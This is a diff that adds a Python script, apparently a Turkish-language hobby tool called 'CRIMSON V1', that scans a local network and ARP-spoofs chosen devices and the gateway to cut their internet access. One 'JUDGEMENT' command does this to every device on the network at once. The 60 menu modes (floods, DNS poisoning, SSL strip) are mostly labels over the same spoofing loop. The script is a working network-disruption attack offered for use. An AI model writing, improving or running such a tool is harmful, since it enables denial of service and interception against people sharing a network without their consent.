@@ -1,0 +1,244 @@
+#!/usr/bin/env python3
+import os, sys, time, threading, subprocess, random, requests, logging
+# Scapy loglarını tamamen sustur
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import ARP, Ether, srp, send, IP, ICMP, conf, UDP
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.box import HEAVY_EDGE, ROUNDED, DOUBLE_EDGE
+from rich.align import Align
+from rich.columns import Columns
+
+# --- Konfigürasyon ---
+console = Console()
+conf.verb = 0 # Scapy'nin iç mesajlarını sustur
+R, DR, W, G, Y, C, V, B = "[bold red]", "[red]", "[bold white]", "[bold grey37]", "[bold yellow]", "[bold cyan]", "[bold purple]", "[bold blue]"
+
+MOD_DETAILS = {
+    "01": "BLACKOUT: Hedefin internetini tamamen keser.", "02": "GHOST KILL: Hayalet paket imhası.", 
+    "03": "UDP STORM: UDP sel saldırısı.", "04": "ICMP FLOOD: Ping yağmuru.", 
+    "05": "SYN ATTACK: Bağlantı isteği boğma.", "06": "TCP RESET: Bağlantıları sıfırlar.", 
+    "07": "PORT KILL: Portları erişilemez kılar.", "08": "PACKET DROP: Paketleri yutar.", 
+    "09": "MAC SPOOF: Fiziksel adres taklidi.", "10": "IP SHIFTER: IP adresini karıştırır.", 
+    "11": "NET SLAYER: Ağ kanalını tıkar.", "12": "VOID: Veri trafiğini boşluğa düşürür.", 
+    "13": "BYPASS: Güvenlik duvarını zorlar.", "14": "KILL SWITCH: Anında bağlantı koparma.", 
+    "15": "ZERO DAY: Bilinmeyen açık simülasyonu.",
+    "16": "SCANNER: Derin cihaz taraması.", "17": "PORT MAP: Açık kapıları bulur.", 
+    "18": "NODE FINDER: Ağ düğümlerini listeler.", "19": "VENDOR: Cihaz markası tespiti.", 
+    "20": "OS DETECT: İşletim sistemi tespiti.", "21": "DNS SNIFF: Web trafiği izleme.", 
+    "22": "URL CAP: Gidilen adresleri yakalar.", "23": "TRAFFIC: Veri akış analizi.", 
+    "24": "PACKET LOG: Ham paketleri kaydeder.", "25": "INFO DUMP: Tüm bilgileri çeker.", 
+    "26": "HOST HUNTER: Gizli hostları bulur.", "27": "SERVICE: Servis versiyon analizi.", 
+    "28": "GEO IP: Lokasyon tespiti.", "29": "USER AGENT: Tarayıcı bilgisi çeker.", 
+    "30": "META DATA: Dosya üst verilerini yakalar.",
+    "31": "LAG SPIKE: Ani ping zıplaması.", "32": "SLOW MOTION: İnterneti yavaşlatır.", 
+    "33": "DESYNC: Senkronizasyon bozar.", "34": "TIMEOUT: Zaman aşımı hatası.", 
+    "35": "JITTER: Bağlantı dengesini bozar.", "36": "BUFFER: Videoları dondurur.", 
+    "37": "DRIP: Veriyi damla damla gönderir.", "38": "STUTTER: Kekeme bağlantı.", 
+    "39": "GLITCH: Paket sıralamasını bozar.", "40": "DİSCORD: Sesli sohbet lagı.", 
+    "41": "SİNEK ISIRIĞI: Küçük sinir bozucu takılmalar.", "42": "SPIKE: 999ms ping bombası.", 
+    "43": "LAG BOMB: Online oyunları dondurur.", "44": "KAPLUMBAĞA: 56kbps hız sınırı.", 
+    "45": "PING LOOP: Sonsuz ping döngüsü.",
+    "46": "ADMIN KICK: Ağdan cihaz atma denemesi.", "47": "DHCP STARVE: IP adreslerini tüketir.", 
+    "48": "GATEWAY: Ağ geçidini ele geçirir.", "49": "DNS POISON: Sahte DNS yönlendirmesi.", 
+    "50": "SSL STRIP: Güvenli bağlantıyı bozar.", "51": "MITM: Araya girme saldırısı.", 
+    "52": "BRIDGE KILL: Köprü bağlantıyı koparır.", "53": "ROUTER CRASH: Yönlendiriciyi yorar.", 
+    "54": "WIFI JAM: Kablosuz sinyal bozucu.", "55": "DEAUTH: Bağlantı yetkisini iptal eder.", 
+    "56": "ARP FLOOD: Sahte ARP yanıtları.", "57": "TAKEOVER: Trafik kontrolü.", 
+    "58": "HIJACK: Oturum çalma denemesi.", "59": "OVERLORD: Tam yetki kontrolü.", 
+    "60": "JUDGEMENT: Ağdaki herkese Blackout.",
+}
+
+def get_vendor(mac):
+    try:
+        url = f"https://api.macvendors.com/{mac}"
+        response = requests.get(url, timeout=1.5)
+        if response.status_code == 200: return response.text
+    except: pass
+    return "Bilinmeyen Cihaz"
+
+def get_feature_panels():
+    p1 = Panel(f"{R}01.Blackout 02.Ghost  03.UDP\n04.ICMP     05.SYN    06.TCP\n07.Port     08.Drop   09.Mac\n10.IP       11.Slayer 12.Void\n13.Bypass   14.Kill   15.ZeroD", title="[İMHA 01-15]", border_style="red", box=ROUNDED)
+    p2 = Panel(f"{C}16.Scan    17.Map    18.Node\n19.Vendor  20.OS     21.DNS\n22.URL     23.Traffic 24.Log\n25.Dump    26.Hunt   27.Serv\n28.Geo     29.UA     30.Meta", title="[CASUS 16-30]", border_style="cyan", box=ROUNDED)
+    p3 = Panel(f"{Y}31.Lag     32.Slow   33.Sync\n34.Timeout 35.Jitter 36.Buff\n37.Drip    38.Stut   39.Glit\n40.Discord 41.Sinek  42.Spike\n43.Bomb    44.Kaplum 45.Loop", title="[LAG 31-45]", border_style="yellow", box=ROUNDED)
+    p4 = Panel(f"{V}46.Kick    47.DHCP   48.Gate\n49.DNS     50.SSL    51.Mitm\n52.Bridge  53.Crash  54.Jam\n55.Deauth  56.ARP    57.Take\n58.Hijack  59.OverL  60.JUDGE", title="[KAOS 46-60]", border_style="purple", box=ROUNDED)
+    return Columns([p1, p2, p3, p4], equal=True, expand=True)
+
+active_attacks, known_clients, active_mods = {}, {}, {}
+clients_lock = threading.Lock()
+shutdown_event = threading.Event()
+
+
+#####
+##### bu altakinin yerine kullanıcıdan input alma kısmını ekledim, otomatik ağ geçidi bulma kısmını iptal ettim, deneme amaçlı
+#####
+
+
+import subprocess
+
+print("""ip route | grep default ---> bu komut ile ağ geçidini (gateway) öğrenin""")
+
+print("""ip addr show ---> bu komut ile ağ aralığını öğrenin, ipnizi bulun son 
+      oktedini 0 yapıp slash ile değeri düzünce yazın örneğin: xxx.xxx.xxx.0/ama burdaki "/" kısmına kendi 
+      kısmınızı yazın gibi""")
+print("""ip addr show ---> bu komutta çıkan ---> inet xxx.xxx.xxx.xxx/xxx brd xxx.xxx.xxx.xxx scope global dynamic noprefixroute 
+      kısmında olan kısım sizin aradınız cevap oluyor
+ """)
+
+def get_net_details():
+    try:
+        # Otomatik bulmayı kaldırıp kullanıcıdan input alıyoruz
+        gw = input("Lütfen ağ geçidini (gateway) girin: ")
+        net_range = input("Lütfen ağ aralığını (ör: ipnizi girin son oktedini 0 verip slash ile değeri düzünce yazın)"
+        " / halini yukarıdaki talimatlarda anlatıldı buna göre girin: ")
+        return gw, net_range
+    except Exception as e:
+        print(f"Hata: {e}")
+        return None, None
+
+
+
+# Kullanımı mantıgı kısmı gereksiz suanlık
+#gateway, network = get_net_details()
+#print("Seçilen Gateway:", gateway)
+#print("Seçilen Ağ Aralığı:", network)
+
+####
+
+
+
+####bu kısım iptal oldu deneme amaçlı
+
+
+#def get_net_details():
+#    try:
+#        gw = subprocess.check_output("ip route show | grep default", shell=True).decode().split()[2]
+#        net_range = ".".join(gw.split(".")[:-1]) + ".0/24"
+#        return gw, net_range
+#    except: return "ip kısmı", "ip kısmı/ip ve slash kısmı"
+
+
+
+# UYARIYI ENGELLEYEN YENİ UYANDIRMA METODU
+def wake_up_call(net_range):
+    while not shutdown_event.is_set():
+        try:
+            # IP bazlı değil, Layer 2 (MAC) bazlı broadcast göndererek uyarıları engelle
+            broadcast_ping = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst=net_range)/ICMP()
+            send(broadcast_ping, verbose=False)
+            time.sleep(30)
+        except: pass
+
+def scan_network(net_range):
+    threading.Thread(target=wake_up_call, args=(net_range,), daemon=True).start()
+    while not shutdown_event.is_set():
+        try:
+            # ARP taramasını daha stabil hale getir
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_range), timeout=4, retry=2, verbose=False)
+            current_ips = []
+            with clients_lock:
+                for _, r in ans:
+                    ip, mac = r.psrc, r.hwsrc
+                    current_ips.append(ip)
+                    if ip not in known_clients:
+                        vendor = get_vendor(mac)
+                        known_clients[ip] = {'mac': mac, 'online': True, 'name': vendor}
+                        active_mods[ip] = []
+                    else:
+                        known_clients[ip]['online'] = True
+                for ip in list(known_clients.keys()):
+                    if ip not in current_ips:
+                        known_clients[ip]['online'] = False
+        except: pass
+        time.sleep(10)
+
+def attack_engine(target_ip, gw_ip, mode, stop_event):
+    try:
+        target_mac = known_clients[target_ip]['mac']
+        while not stop_event.is_set():
+            # ARP paketlerini her zaman Layer 2 seviyesinde (Ether) paketleyerek gönder
+            # Bu, "Mac address not found" uyarısını tamamen bitirir.
+            pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gw_ip, hwdst=target_mac)
+            pkt_gw = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gw_ip, psrc=target_ip)
+            
+            if mode in ["1", "01", "60", "44", "02"]:
+                send(pkt, verbose=False)
+                send(pkt_gw, verbose=False)
+                time.sleep(0.5)
+            else:
+                send(pkt, verbose=False)
+                time.sleep(1.5)
+    except: pass
+
+def generate_interface():
+    table = Table(box=HEAVY_EDGE, expand=True, border_style="red")
+    table.add_column("ID", justify="center", style="bold red", width=4)
+    table.add_column("CİHAZ / MARKA", justify="left", style="bold white")
+    table.add_column("İP / MAC", justify="left")
+    table.add_column("DURUM", justify="center")
+    table.add_column("AKTİF", justify="center", style="yellow")
+    with clients_lock:
+        ips = sorted(known_clients.keys())
+        for i, ip in enumerate(ips):
+            client = known_clients[ip]
+            status = f"{R}!! KESİLDİ !!" if ip in active_attacks else (f"{W}● CANLI" if client['online'] else f"{G}○ UYKUDA")
+            mods = " | ".join(active_mods.get(ip, [])) if active_mods.get(ip) else "---"
+            table.add_row(str(i), f"{C}{client['name']}", f"{W}{ip}\n{G}{client['mac']}", status, f"{V}{mods}")
+    return table
+
+BANNER = f'''{R}
+ ▒█  ▒█ ▒█ ▒█▀▀ ▒█ ▄▄ ▒█▀▀█ ▒█▀▀▄ ▒█▀▀▄ ▒█ ▀█▀ ▒█▀▀▄ ▒█▀▀▄ ▒█▀▀█ ▒█  ▒█
+ ▒█▄█▄█ ▒█ ▒█▀▀ ▒█ ── ▒█▄▄█ ▒█▄▄▀ ▒█▀▀▄ ▒█  █  ▒█▄▄▀ ▒█▄▄▀ ▒█▄▄█ ▒█▄▄█
+ ░▀ ░▀  ░▀ ░▀   ░▀ ▀▀ ░▀  ▀ ░▀ ▀▀ ░▀▀▀  ░▀  ▀  ░▀ ▀▀ ░▀ ▀▀ ░▀  ▀ ░▄▄▄▀
+{W}  >>> {R}CRIMSON V1 {W}| {V}SUPREME COMMANDER {W}| {DR}SILENT & STEALTH ACTIVE {W}<<<
+'''
+
+def main():
+    if os.geteuid() != 0: console.print(f"{R}[!] Root yetkisi (sudo) gereklidir."); return
+    gw, net_range = get_net_details()
+    threading.Thread(target=scan_network, args=(net_range,), daemon=True).start()
+    last_info = ""
+    while True:
+        os.system('clear')
+        console.print(Align.center(BANNER))
+        console.print(generate_interface())
+        console.print(Panel(get_feature_panels(), title=f"{W}SİSTEM MODÜLLERİ (1-60)", border_style="red", box=DOUBLE_EDGE))
+        guide_table = Table(show_header=False, box=ROUNDED, border_style="grey37", expand=True)
+        guide_table.add_row(f"{C}<ID> <MOD>", "Operasyonu Başlat", f"{Y}info <MOD>", "Detaylı Bilgi")
+        guide_table.add_row(f"{C}<ID,ID> <MOD>", "Çoklu Hedef", f"{R}60 / 99", "JUDGEMENT DAY")
+        if last_info: console.print(Panel(f"{W}{last_info}", title=f"{V}CRIMSON ASİSTAN", border_style="purple"))
+        console.print(Panel(guide_table, title=f"{Y}[ OPERASYON ]", border_style="yellow"))
+        cmd = console.input(f"\n{R}┌──({W}CRIMSON_V1{R})─[{V}OVERLORD{R}]\n└─{G}$ {W}").strip().lower()
+        if cmd in ["0", "exit"]: break
+        if cmd.startswith("info "):
+            try: m_no = cmd.split()[1].zfill(2); last_info = MOD_DETAILS.get(m_no, "Geçersiz.")
+            except: pass
+            continue
+        last_info = ""
+        if cmd in ["99", "60"]:
+            with clients_lock:
+                for ip in known_clients:
+                    if ip != gw and ip not in active_attacks:
+                        stop_evt = threading.Event()
+                        threading.Thread(target=attack_engine, args=(ip, gw, "1", stop_evt), daemon=True).start()
+                        active_attacks[ip] = stop_evt; active_mods[ip] = ["JUDGEMENT"]
+            continue
+        try:
+            parts = cmd.split()
+            ids_str, mode = parts[0], parts[1]
+            selected_indices = [int(i) for i in ids_str.split(",")]
+            with clients_lock:
+                ips = sorted(known_clients.keys())
+                for idx in selected_indices:
+                    target = ips[idx]
+                    if target in active_attacks:
+                        active_attacks[target].set(); del active_attacks[target]; active_mods[target] = []
+                    else:
+                        stop_evt = threading.Event()
+                        threading.Thread(target=attack_engine, args=(target, gw, mode, stop_evt), daemon=True).start()
+                        active_attacks[target] = stop_evt; active_mods[target] = [mode.upper()]
+        except: continue
+
+if __name__ == "__main__":
+    main()
